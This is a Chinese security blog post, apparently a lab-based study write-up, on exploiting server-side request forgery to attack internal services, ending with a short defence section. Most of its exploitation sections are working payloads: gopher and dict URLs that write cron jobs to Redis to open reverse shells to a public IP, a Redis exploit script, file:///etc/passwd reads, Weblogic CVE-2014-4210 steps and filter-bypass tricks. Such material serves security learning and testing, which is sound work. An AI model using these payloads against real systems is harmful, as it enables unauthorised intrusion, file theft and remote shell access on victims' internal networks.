<!DOCTYPE html><html><head><meta name=generator content="Hexo 3.9.0"><meta charset=utf-8><title>SSRF漏洞的利用与攻击内网应用 | qwzf</title><meta name=viewport content="width=device-width, initial-scale=1, maximum-scale=1"><meta name=keywords content="qwzf,Qwzf's Blog"><meta name=description content="首发于先知社区 0x00 前言学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！ 0x01 SSRF漏洞简介1.SSRF漏洞概述SSRF(Server-Side Request Forgery:服务器端请求伪造)"><meta name=keywords content=BUG,SSRF><meta property=og:type content=article><meta property=og:title content=SSRF漏洞的利用与攻击内网应用><meta property=og:url content=https://qwzf.github.io/2020/03/21/SSRF漏洞的利用与攻击内网应用/index.html><meta property=og:site_name content=qwzf><meta property=og:description content="首发于先知社区 0x00 前言学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！ 0x01 SSRF漏洞简介1.SSRF漏洞概述SSRF(Server-Side Request Forgery:服务器端请求伪造)"><meta property=og:locale content=zh-CN><meta property=og:image content=http://img-blog.csdnimg.cn/20200226013932770.png><meta property=og:image content=http://img-blog.csdnimg.cn/20200314223649130.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315022633485.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020031520301679.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315192751112.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020031519243676.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315192908343.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315192635710.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020031503404153.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315212726403.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315213259661.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315220452561.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315214024658.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/20200315214948662.jpg><meta property=og:image content=http://img-blog.csdnimg.cn/2020031521485090.jpg><meta property=og:updated_time content=2020-04-01T16:45:16.054Z><meta name=twitter:card content=summary><meta name=twitter:title content=SSRF漏洞的利用与攻击内网应用><meta name=twitter:description content="首发于先知社区 0x00 前言学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！ 0x01 SSRF漏洞简介1.SSRF漏洞概述SSRF(Server-Side Request Forgery:服务器端请求伪造)"><meta name=twitter:image content=http://img-blog.csdnimg.cn/20200226013932770.png><link rel=icon href=/favicon.ico><link href=//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/css/style.css><script src=/js/pace.min.js></script></head></html><script src=https://g.joyinshare.com/hc/ribbon.min.js type=text/javascript></script><canvas class=fireworks style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas><script type=text/javascript src=//cdn.bootcss.com/animejs/2.2.0/anime.min.js></script><script type=text/javascript src=/js/clicklove.js></script><body><div id=container><header id=header><div id=banner></div><div id=header-outer><div id=header-menu class="header-menu-pos animated"><div class=header-menu-container><a href="/" class=left><span class=site-title>Qwzf&#39;s Blog</span></a><nav id=header-menu-nav class=right><a href="/"><i class="fa fa-home"></i> <span>Home</span></a> <a target=_blank href=/archives><i class="fa fa-archive"></i> <span>Archives</span></a> <a href=/about><i class="fa fa-user"></i> <span>About</span></a></nav><a class=mobile-header-menu-button><i class="fa fa-bars"></i></a></div></div><div id=header-row><div id=logo><a href="/"><img src=/images/logo.png alt=logo></a></div><div class=header-info><div id=header-title><h2>Qwzf&#39;s Blog</h2></div><div id=header-description><h3>一个爱学习的小白</h3></div></div><nav class=header-nav><div class=social><a title=qwzf target=_blank href=//qwzf.github.io><i class="fa fa-home fa-2x"></i></a> <a title=Github target=_blank href="//github.com/"><i class="fa fa-github fa-2x"></i></a> <a title=Weibo target=_blank href="//weibo.com/"><i class="fa fa-weibo fa-2x"></i></a> <a title=Twitter target=_blank href="//twitter.com/"><i class="fa fa-twitter fa-2x"></i></a></div></nav></div></div></header><div class=outer><section id=main class=body-wrap><article id=post-SSRF漏洞的利用与攻击内网应用 class="article article-type-post" itemscope itemprop=blogPost><div class=article-inner><header class=article-header><h1 class=post-title itemprop=name>SSRF漏洞的利用与攻击内网应用</h1><div class=post-title-bar><ul><li><i class="fa fa-book"></i> <span class=post-meta-item-text>分类:</span> <span class=post-count><a href="/categories/Web/">Web</a></span></li><li><i class="fa fa-calendar"></i> <span class=post-meta-item-text>日期:</span> <span class=post-count>2020-03-21</span></li><li><i class="fa fa-eye"></i> <span class=post-meta-item-text>阅读量:</span> <span id=busuanzi_value_page_pv>次</span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-keyboard-o"></i> <span class=post-meta-item-text>字数统计:</span> <span class=post-count>3.2k字</span></span></span></li><li><span class=post-time><span class=post-meta-item-icon><i class="fa fa-hourglass-half"></i> <span class=post-meta-item-text>阅读时长:</span> <span class=post-count>14分</span></span></span></li></ul></div></header><div class="article-entry post-content" itemprop=articleBody><p><strong>首发于先知社区</strong></p><h3 id=0x00-前言><a href=#0x00-前言 class=headerlink title="0x00 前言"></a>0x00 前言</h3><p>学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。<br>CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。<br>因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！</p><h4 id=0x01-SSRF漏洞简介><a href=#0x01-SSRF漏洞简介 class=headerlink title="0x01 SSRF漏洞简介"></a>0x01 SSRF漏洞简介</h4><p><strong>1.SSRF漏洞概述</strong><br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<br>一般情况下，SSRF攻击的目标是从外网无法访问的<code>内部系统</code>。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）<br><img src=http://img-blog.csdnimg.cn/20200226013932770.png alt=在这里插入图片描述><br><strong>2.SSRF漏洞产生原因</strong><br>SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。<br>如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用<code>存在缺陷的web应用作为代理</code>攻击远程和本地的服务器。</p><p><strong>3.容易出现SSRF的地方</strong></p><ol><li>转码服务</li><li>在线翻译</li><li>图片加载与下载(通过URL地址加载或下载图片)</li><li>图片、文章收藏功能</li><li>网站采集、网页抓取的地方。</li><li>头像的地方。(远程加载头像)</li><li>一切要你输入网址的地方和可以输入ip的地方。</li><li>从URL关键字中寻找：<code>share</code>、<code>wap</code>、<code>url</code>、<code>link</code>、<code>src</code>、<code>source</code>、<code>target</code>、<code>u</code>、<code>3g</code>、<code>display</code>、<code>sourceURl</code>、<code>imageURL</code>、<code>domain</code><br>…</li></ol><p><strong>4.利用SSRF可以实现的攻击</strong></p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<a href=http://www.cnblogs.com/yuanshu/p/11588341.html target=_blank rel=noopener>banner 信息</a></li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</li><li>下载内网资源(如：利用<code>file</code>协议读取本地文件等)</li><li>进行跳板</li><li>无视cdn</li><li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li></ol><h3 id=0x02-SSRF漏洞相关函数和协议><a href=#0x02-SSRF漏洞相关函数和协议 class=headerlink title="0x02 SSRF漏洞相关函数和协议"></a>0x02 SSRF漏洞相关函数和协议</h3><p><strong>1.函数</strong><br><code>file_get_contents()</code>、<code>fsockopen()</code>、<code>curl_exec()</code>、<code>fopen()</code>、<code>readfile()</code>等函数使用不当会造成SSRF漏洞<br>（1）file_get_contents()</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=meta>&lt;?php</span></span><br><span class=line>$url = $_GET[<span class=string>'url'</span>];;</span><br><span class=line><span class=keyword>echo</span> file_get_contents($url);</span><br><span class=line><span class=meta>?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>file_get_content</code>函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p></blockquote><p>（2）fsockopen()</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=meta>&lt;?php</span> </span><br><span class=line><span class=function><span class=keyword>function</span> <span class=title>GetFile</span><span class=params>($host,$port,$link)</span> </span>&#123; </span><br><span class=line>    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class=number>30</span>);   </span><br><span class=line>    <span class=keyword>if</span> (!$fp) &#123; </span><br><span class=line>		<span class=keyword>echo</span> <span class=string>"$errstr (error number $errno) \n"</span>; </span><br><span class=line>	&#125; <span class=keyword>else</span> &#123; </span><br><span class=line>		$out = <span class=string>"GET $link HTTP/1.1\r\n"</span>; </span><br><span class=line>		$out .= <span class=string>"Host: $host\r\n"</span>; </span><br><span class=line>		$out .= <span class=string>"Connection: Close\r\n\r\n"</span>; </span><br><span class=line>		$out .= <span class=string>"\r\n"</span>; </span><br><span class=line>		fwrite($fp, $out); </span><br><span class=line>		$contents=<span class=string>''</span>; </span><br><span class=line>		<span class=keyword>while</span> (!feof($fp)) &#123; </span><br><span class=line>			$contents.= fgets($fp, <span class=number>1024</span>); </span><br><span class=line>		&#125; </span><br><span class=line>		fclose($fp); </span><br><span class=line>		<span class=keyword>return</span> $contents; </span><br><span class=line>	&#125; </span><br><span class=line>&#125;</span><br><span class=line><span class=meta>?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>fsockopen</code>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p></blockquote><p>（3）curl_exec()</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=meta>&lt;?php</span> </span><br><span class=line><span class=keyword>if</span> (<span class=keyword>isset</span>($_POST[<span class=string>'url'</span>]))&#123;</span><br><span class=line>	$link = $_POST[<span class=string>'url'</span>];</span><br><span class=line>	$curlobj = curl_init();<span class=comment>// 创建新的 cURL 资源</span></span><br><span class=line>	curl_setopt($curlobj, CURLOPT_POST, <span class=number>0</span>);</span><br><span class=line>	curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class=line>	curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, <span class=number>1</span>);<span class=comment>// 设置 URL 和相应的选项</span></span><br><span class=line>	$result=curl_exec($curlobj);<span class=comment>// 抓取 URL 并把它传递给浏览器</span></span><br><span class=line>	curl_close($curlobj);<span class=comment>// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class=line> </span><br><span class=line>	$filename = <span class=string>'./curled/'</span>.rand().<span class=string>'.txt'</span>;</span><br><span class=line>	file_put_contents($filename, $result); </span><br><span class=line>	<span class=keyword>echo</span> $result;</span><br><span class=line>&#125;</span><br><span class=line><span class=meta>?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话</p></blockquote><p><strong>注意</strong></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=number>1.</span>一般情况下PHP不会开启fopen的gopher wrapper</span><br><span class=line><span class=number>2.</span>file_get_contents的gopher协议不能URL编码</span><br><span class=line><span class=number>3.</span>file_get_contents关于Gopher的<span class=number>302</span>跳转会出现bug，导致利用失败</span><br><span class=line><span class=number>4.</span>curl/libcurl <span class=number>7.43</span> 上gopher协议存在bug(%<span class=number>00</span>截断) 经测试<span class=number>7.49</span> 可用</span><br><span class=line><span class=number>5.</span>curl_exec() <span class=comment>//默认不跟踪跳转，</span></span><br><span class=line><span class=number>6.</span>file_get_contents() <span class=comment>// file_get_contents支持php://input协议</span></span><br></pre></td></tr></table></figure><p><strong>2.协议</strong><br>（1）<code>file</code>： 在有回显的情况下，利用 file 协议可以读取任意内容<br>（2）<code>dict</code>：泄露安装软件版本信息，查看端口，操作内网redis服务等<br>（3）<code>gopher</code>：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell<br>（4）<code>http/s</code>：探测内网主机存活</p><h3 id=0x03-SSRF漏洞利用><a href=#0x03-SSRF漏洞利用 class=headerlink title="0x03 SSRF漏洞利用"></a>0x03 SSRF漏洞利用</h3><h4 id=本地利用><a href=#本地利用 class=headerlink title=本地利用></a>本地利用</h4><p>以curl举例，查看 curl 支持的协议列表 <code>curl -V</code>。<strong>本地利用方式</strong>：<br>（1）使用file协议 file protocol (任意文件读取)</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -vvv 'file:///etc/passwd'</span><br></pre></td></tr></table></figure><p>（2）使用dict协议 dict protocol (获取Redis配置信息)</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -vvv 'dict://127.0.0.1:6379/info'</span><br></pre></td></tr></table></figure><p>（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span><br></pre></td></tr></table></figure><h4 id=远程利用><a href=#远程利用 class=headerlink title=远程利用></a>远程利用</h4><h5 id=1、环境><a href=#1、环境 class=headerlink title=1、环境></a>1、环境</h5><p>攻击机ip：192.168.201.129、121.36.67.230<br>攻击机：Kali、公网服务器<br>远程服务器ip：39.x.x.x<br>docker镜像：ssrf_redis<br>PHP版本：PHP Version 7.2.28(5.6版本测试会失败)</p><h5 id=2、远程利用示例代码><a href=#2、远程利用示例代码 class=headerlink title=2、远程利用示例代码></a>2、远程利用示例代码</h5><p><code>ssrf.php</code></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=meta>&lt;?php</span></span><br><span class=line>$ch = curl_init(); <span class=comment>//创建新的 cURL 资源</span></span><br><span class=line>curl_setopt($ch, CURLOPT_URL, $_GET[<span class=string>'url'</span>]); <span class=comment>//设置URL 和相应的选项</span></span><br><span class=line><span class=comment>#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class=line>curl_setopt($ch, CURLOPT_HEADER, <span class=number>0</span>);</span><br><span class=line><span class=comment>#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_http);</span></span><br><span class=line>curl_exec($ch); <span class=comment>//抓取 URL 内容并把它传递给浏览器，存储进文件</span></span><br><span class=line>curl_close($ch); <span class=comment>////关闭 cURL 资源，并且释放系统资源</span></span><br><span class=line><span class=meta>?&gt;</span></span><br></pre></td></tr></table></figure><p><code>post.php</code></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>&lt;html&gt;</span><br><span class=line>&lt;head&gt;</span><br><span class=line>    &lt;title&gt;post&lt;/title&gt;</span><br><span class=line>&lt;/head&gt;</span><br><span class=line>&lt;body&gt;</span><br><span class=line>    <span class=meta>&lt;?php</span></span><br><span class=line>    <span class=keyword>echo</span> $_REQUEST[cmd];</span><br><span class=line>    <span class=meta>?&gt;</span></span><br><span class=line>&lt;/body&gt;</span><br><span class=line>&lt;/html&gt;</span><br></pre></td></tr></table></figure><h5 id=3、远程利用方式><a href=#3、远程利用方式 class=headerlink title=3、远程利用方式></a>3、远程利用方式</h5><p><strong>1.利用<code>file</code>协议</strong><br>任意文件读取</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -v 'http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd'</span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200314223649130.jpg alt=在这里插入图片描述><br><strong>2.利用<code>dict</code>协议</strong><br>（1）查看端口及端口上运行服务的版本信息</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -v 'http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/'</span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200315022633485.jpg alt=在这里插入图片描述><br>说明22端口开放<br>（2）通过dict协议getshell<br>有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上<code>\r\n</code>(CRLF)。<br>dict协议要一条一条的执行，而gopher协议执行一条命令就行了。<br><img src=http://img-blog.csdnimg.cn/2020031520301679.jpg alt=在这里插入图片描述><br>一条一条的执行就可以了。<br><strong>3.利用<code>gopher</code>协议</strong><br>（1）攻击内网redis并反弹shell<br>利用redis未授权访问攻击redis<br><code>攻击redis的exp</code></p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>echo -e "\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\n\n\n"|redis-cli -h $1 -p $2 -x set 1</span><br><span class=line>redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class=line>redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class=line>redis-cli -h $1 -p $2 save</span><br><span class=line>redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>bash shell.sh 39.x.x.x 6379</span><br></pre></td></tr></table></figure><p>从而捕获到数据，并进行转换<br>转换规则如下：<br>如果第一个字符是<code>&gt;</code>或者<code>&lt;</code>那么丢弃该行字符串，表示请求和返回的时间。<br>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>将<code>\r</code>字符串替换成<code>%0d%0a</code><br>空白行替换为<code>%0a</code></p><p>结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell：</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -v 'http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'</span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200315192751112.jpg alt=在这里插入图片描述><br><img src=http://img-blog.csdnimg.cn/2020031519243676.jpg alt=在这里插入图片描述><br>反弹成功<br><code>http://39.x.x.x:8000/ssrf.php</code>是存在SSRF漏洞的Web服务<br><code>192.168.1.4</code>是redis应用所在内网ip<br><code>121.36.67.230</code>是公网服务器，接收反弹shell<br>（2）伪造post请求反弹shell</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>curl -v 'http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261'</span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200315192908343.jpg alt=在这里插入图片描述><br><img src=http://img-blog.csdnimg.cn/20200315192635710.jpg alt=在这里插入图片描述><br>反弹成功<br><code>192.168.1.5</code>是内网Web服务，有post.php<br><strong>4 .利用<code>http/s</code>协议</strong><br>探测内网主机存活<br><img src=http://img-blog.csdnimg.cn/2020031503404153.jpg alt=在这里插入图片描述><br>说明内网ip为<code>192.168.1.3</code>的主机存活</p><h3 id=0x04-SSRF攻击应用实战><a href=#0x04-SSRF攻击应用实战 class=headerlink title="0x04 SSRF攻击应用实战"></a>0x04 SSRF攻击应用实战</h3><h4 id=1、gopher攻击redis><a href=#1、gopher攻击redis class=headerlink title=1、gopher攻击redis></a>1、gopher攻击redis</h4><p>参考<strong>远程利用 3.利用<code>gopher</code>协议</strong></p><h4 id=2、weblogic-ssrf攻击redis><a href=#2、weblogic-ssrf攻击redis class=headerlink title="2、weblogic ssrf攻击redis"></a>2、weblogic ssrf攻击redis</h4><p>CVE-2014-4210<br>下载地址：<a href=https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf target=_blank rel=noopener>https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</a><br>编译并启动环境</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>docker-compose build</span><br><span class=line>docker-compose up -d</span><br></pre></td></tr></table></figure><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code><br><strong>1.查看端口</strong><br>访问</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http:<span class=comment>//127.0.0.1:80</span></span><br><span class=line><span class=comment>//测试http://127.0.0.1:7001：将80替换成7001</span></span><br></pre></td></tr></table></figure><p><img src=http://img-blog.csdnimg.cn/20200315212726403.jpg alt=在这里插入图片描述><br>not connect，说明80端口未开放<br><img src=http://img-blog.csdnimg.cn/20200315213259661.jpg alt=在这里插入图片描述><br>返回404，说明端口开放<br><strong>2.探测内网主机存活</strong><br><img src=http://img-blog.csdnimg.cn/20200315220452561.jpg alt=在这里插入图片描述><br>说明内网ip为<code>192.168.1.1</code>的主机存活<br><strong>3.注入HTTP头，利用Redis反弹shell</strong><br>通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通<br>和上边的远程利用几乎一样。<br><img src=http://img-blog.csdnimg.cn/20200315214024658.jpg alt=在这里插入图片描述><br>将反弹shell脚本写入/etc/crontab定时任务</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line>set 1 "\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\n\n\n\n"</span><br><span class=line>config set dir /etc/</span><br><span class=line>config set dbfilename crontab</span><br><span class=line>save</span><br></pre></td></tr></table></figure><p>进行url编码</p><figure class="highlight shell"><table><tr><td class=code><pre><span class=line><span class=meta>test%</span><span class=bash>0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span></span><br></pre></td></tr></table></figure><p>换行符是“\r\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送<br><img src=http://img-blog.csdnimg.cn/20200315214948662.jpg alt=在这里插入图片描述><br>反弹成功<br><img src=http://img-blog.csdnimg.cn/2020031521485090.jpg alt=在这里插入图片描述></p><h3 id=0x05-SSRF漏洞相关绕过><a href=#0x05-SSRF漏洞相关绕过 class=headerlink title="0x05 SSRF漏洞相关绕过"></a>0x05 SSRF漏洞相关绕过</h3><h4 id=1、常用绕过方法><a href=#1、常用绕过方法 class=headerlink title=1、常用绕过方法></a>1、常用绕过方法</h4><p><strong>1.@</strong></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>http:<span class=comment>//abc@127.0.0.1</span></span><br><span class=line>实际上是以用户名abc连接到站点<span class=number>127.0</span><span class=number>.0</span><span class=number>.1</span>，同理</span><br><span class=line>http:<span class=comment>//8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</span></span><br></pre></td></tr></table></figure><p>在对@解析域名中，不同的处理函数存在处理差异，如：<br><code>http://www.aaa.com@www.bbb.com@www.ccc.com</code><br>在PHP的<code>parse_url</code>中会识别<a href=http://www.ccc.com，而`libcur`l则识别为www.bbb.com target=_blank rel=noopener>www.ccc.com，而`libcur`l则识别为www.bbb.com</a><br><strong>2.利用[::]</strong><br>可以利用<code>[::]</code>来绕过localhost</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>http:<span class=comment>//[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span></span><br></pre></td></tr></table></figure><p><strong>3.添加端口号</strong></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line>http:<span class=comment>//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure><p><strong>4.利用短网址</strong><br><a href=https://tool.chinaz.com/tools/dwz.aspx target=_blank rel=noopener>站长工具短网址</a><br><a href="https://dwz.cn/" target=_blank rel=noopener>百度短网址</a><br><strong>5.利用特殊域名</strong><br>原理是DNS解析。xip.io可以指向任意域名，即</p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=number>127.0</span><span class=number>.0</span><span class=number>.1</span>.xip.io，可解析为<span class=number>127.0</span><span class=number>.0</span><span class=number>.1</span></span><br></pre></td></tr></table></figure><p><strong>6.利用DNS解析</strong><br>在域名上设置A记录，指向127.0.1<br><strong>7.利用进制转换</strong></p><blockquote><p>127.0.0.1<br>八进制：0177.0.0.1<br>十六进制：0x7f.0.0.1<br>十进制：2130706433</p></blockquote><p><strong>8.句号</strong></p><figure class="highlight php"><table><tr><td class=code><pre><span class=line><span class=number>127</span>。<span class=number>0</span>。<span class=number>0</span>。<span class=number>1</span>  &gt;&gt;&gt;  <span class=number>127.0</span><span class=number>.0</span><span class=number>.1</span></span><br></pre></td></tr></table></figure><p><strong>9.302跳转</strong><br>使用<a href=http://tinyurl.com生成302跳转地址 target=_blank rel=noopener>http://tinyurl.com生成302跳转地址</a></p><h4 id=2、常见限制><a href=#2、常见限制 class=headerlink title=2、常见限制></a>2、常见限制</h4><p><strong>1.限制为<a href=http://www.xxx.com target=_blank rel=noopener>http://www.xxx.com</a> 域名</strong><br>采用http基本身份认证的方式绕过。即@<br><code>http://www.xxx.com@www.xxc.com</code><br><strong>2.限制请求IP不为内网地址</strong><br>当不允许ip为内网地址时<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换<br><strong>3.限制请求只为http协议</strong><br>（1）采取302跳转<br>（2）采取短地址</p><h3 id=0x06-SSRF漏洞防御><a href=#0x06-SSRF漏洞防御 class=headerlink title="0x06 SSRF漏洞防御"></a>0x06 SSRF漏洞防御</h3><p>1、禁用不需要的协议(如：<code>file:///</code>、<code>gopher://</code>,<code>dict://</code>等)。仅仅允许http和http请求<br>2、统一错误信息，防止根据错误信息判断端口状态<br>3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址<br>4、设置URL白名单或者限制内网IP</p><h3 id=0x07-后记><a href=#0x07-后记 class=headerlink title="0x07 后记"></a>0x07 后记</h3><p>在SSRF漏洞的学习过程中，遇到了一些问题，比如反弹shell到公网服务器，折腾了许久。不过最终克服了问题。同时，通过SSRF漏洞的学习，发现SSRF漏洞果然比CSRF漏洞的利用的局限性要小，并且SSRF漏洞的对内网的一些应用危害比较大。所以在开发过程中，要尽量避免产生SSRF漏洞。</p><p>参考博客：<br><a href=http://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#0x01-SSRF-%E6%A6%82%E8%BF%B0 target=_blank rel=noopener>SSRF 漏洞学习</a><br><a href=https://www.cnblogs.com/flokz/p/weblogic_SSRF.html target=_blank rel=noopener>SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）</a><br><a href=https://www.jianshu.com/p/fd27f0eedccf target=_blank rel=noopener>ssrf攻击内网应用</a><br><a href=https://www.secpulse.com/archives/65832.html target=_blank rel=noopener>SSRF绕过方法总结</a></p><div class=post-copyright><div class=content><p>最后更新： 2020年04月02日 00:45</p><p>原始链接： <a class=post-url href="/2020/03/21/SSRF漏洞的利用与攻击内网应用/" 